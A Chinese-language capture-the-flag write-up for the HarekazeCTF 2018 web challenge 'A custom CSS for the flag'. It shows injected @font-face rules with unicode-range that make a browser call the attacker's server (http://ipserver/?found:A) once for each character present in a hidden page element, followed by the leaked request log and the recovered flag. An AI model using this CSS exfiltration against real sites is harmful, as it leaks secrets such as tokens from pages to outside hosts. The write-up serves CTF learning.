# A custom CSS for the flag
## Challenge details
|       Event        | Challenge | Category | Points  |
|:-------------------|:----------|:---------|:-------:|
|        HarekazeCTF 2018            |     A custom CSS for the flag      |    Web      |    250     |

### Description
> Let’s decorate with fashionable CSS in this site.
### Attachments
> `server.js`
## Solution
查看server.js，可以看到这个网站的逻辑是我们将一个css文件的网址写入输入框，后台接收到参数后，调用chromium访问本地的另外一个3002端口的server  
在3002的server中，程序会返回
```html
<html>
    <link rel="stylesheet" href="${encodeURI(req.query.css)}" />
    <body>
        <div id="flag">
                HarekazeCTF{${fs.readFileSync("flag.txt")}}
        </div>
    </body>
</html>
```
所以我们能影响到的只有包含的css文件  
我们可以通过font-face拿到flag的字符集  
[font-face](http://www.w3school.com.cn/css3/css3_font.asp)  
例如
```css
@font-face{
    font-family:'A';
    src:url('http://ipserver/?found:A');
    unicode-range:U+0041;
}
```
最后加上
```css
#flag{
    font-family:'A','B','C' ... 
}
```
这样当flag中有特定的字符时，就能向我们自己的服务器发送特定的请求  
最后生成css的代码见`generate.py`  
上传css的地址后，我们就可以在我们的服务器上看到
```
163.43.29.129 - - [14/Feb/2018 13:23:11] "GET /?found:a HTTP/1.1" 200 -
163.43.29.129 - - [14/Feb/2018 13:23:11] "GET /?found:b HTTP/1.1" 200 -
163.43.29.129 - - [14/Feb/2018 13:23:11] "GET /?found:C HTTP/1.1" 200 -
163.43.29.129 - - [14/Feb/2018 13:23:11] "GET /?found:d HTTP/1.1" 200 -
163.43.29.129 - - [14/Feb/2018 13:23:11] "GET /?found:e HTTP/1.1" 200 -
163.43.29.129 - - [14/Feb/2018 13:23:11] "GET /?found:F HTTP/1.1" 200 -
163.43.29.129 - - [14/Feb/2018 13:23:12] "GET /?found:H HTTP/1.1" 200 -
163.43.29.129 - - [14/Feb/2018 13:23:12] "GET /?found:o HTTP/1.1" 200 -
163.43.29.129 - - [14/Feb/2018 13:23:12] "GET /?found:k HTTP/1.1" 200 -
163.43.29.129 - - [14/Feb/2018 13:23:12] "GET /?found:r HTTP/1.1" 200 -
163.43.29.129 - - [14/Feb/2018 13:23:12] "GET /?found:T HTTP/1.1" 200 -
163.43.29.129 - - [14/Feb/2018 13:23:12] "GET /?found:z HTTP/1.1" 200 -
163.43.29.129 - - [14/Feb/2018 13:23:12] "GET /?found:{ HTTP/1.1" 200 -
163.43.29.129 - - [14/Feb/2018 13:23:12] "GET /?found:- HTTP/1.1" 200 -
163.43.29.129 - - [14/Feb/2018 13:23:12] "GET /?found:m HTTP/1.1" 200 -
163.43.29.129 - - [14/Feb/2018 13:23:12] "GET /?found:t HTTP/1.1" 200 -
163.43.29.129 - - [14/Feb/2018 13:23:12] "GET /?found:f HTTP/1.1" 200 -
163.43.29.129 - - [14/Feb/2018 13:23:12] "GET /?found:l HTTP/1.1" 200 -
163.43.29.129 - - [14/Feb/2018 13:23:12] "GET /?found:i HTTP/1.1" 200 -
163.43.29.129 - - [14/Feb/2018 13:23:12] "GET /?found:n HTTP/1.1" 200 -
163.43.29.129 - - [14/Feb/2018 13:23:12] "GET /?found:s HTTP/1.1" 200 -
163.43.29.129 - - [14/Feb/2018 13:23:12] "GET /?found:u HTTP/1.1" 200 -
163.43.29.129 - - [14/Feb/2018 13:23:12] "GET /?found:_ HTTP/1.1" 200 -
163.43.29.129 - - [14/Feb/2018 13:23:12] "GET /?found:c HTTP/1.1" 200 -
163.43.29.129 - - [14/Feb/2018 13:23:12] "GET /?found:} HTTP/1.1" 200 -
```
这样我们就得到了flag的字符集  
最后在所有css的属性中找到符合条件的属性  
http://www.w3school.com.cn/cssref/index.asp  
暴力提交一下  
HarekazeCTF{border-bottom-left-radius_animation-direction}

## Link
[font-face](http://www.w3school.com.cn/css3/css3_font.asp)  
[所有css属性](http://www.w3school.com.cn/cssref/index.asp)